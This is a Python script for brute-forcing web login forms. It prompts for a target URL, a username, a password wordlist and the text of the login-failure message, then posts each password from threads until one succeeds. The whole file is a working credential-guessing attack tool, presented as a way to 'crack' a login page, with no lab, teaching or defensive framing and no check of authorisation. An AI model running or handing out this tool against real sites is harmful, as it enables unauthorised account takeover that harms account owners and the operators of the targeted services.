import requests
import threading
import time

# Shared variable to indicate if password is found
password_found = False
# Lock to synchronize access to shared variable
lock = threading.Lock()

def attempt_login(url, username, password, login_failed_string):
    global password_found
    global lock
    with lock:
        if not password_found:
            data = {'username': username, 'password': password, 'Login': 'submit'}
            response = requests.post(url, data=data)
            if login_failed_string in response.text:
                print("[*] Attempting password: %s" % password)
            else:
                print("[*] Password found: %s " % password)
                password_found = True

try:
    # Define the webpage you want to crack (login page)
    url = input("Enter the URL of the login page: ")

    # Get the username
    username = input("What is the username you wish to attempt? ")

    # Get the password file name
    password_file = input("Please enter the name of the password file: ")

    login_failed_string = input('Enter String That Occurs When Login Fails: ')

    # Create a list to store threads
    threads = []

    # Open the password file in read mode
    with open(password_file, "r", encoding="utf-8") as file:
        # Read each password in the password_file
        for password in file.readlines():
            # Strip the password of any newline characters
            password = password.strip("\n")

            # Create a new thread for each password attempt
            thread = threading.Thread(target=attempt_login, args=(url, username, password, login_failed_string))
            thread.start()
            threads.append(thread)

            # Limit the number of concurrent threads to prevent overwhelming the server
            if len(threads) >= 10:
                for thread in threads:
                    thread.join()
                threads.clear()
                time.sleep(1)

            # Break if password is found
            if password_found:
                break

    # Wait for remaining threads to finish
    for thread in threads:
        thread.join()

except requests.ConnectionError:
    print("Connection Error: Unable to connect to the server. Please check your internet connection or the server URL.")

except Exception as e:
    print("An error occurred:", e)

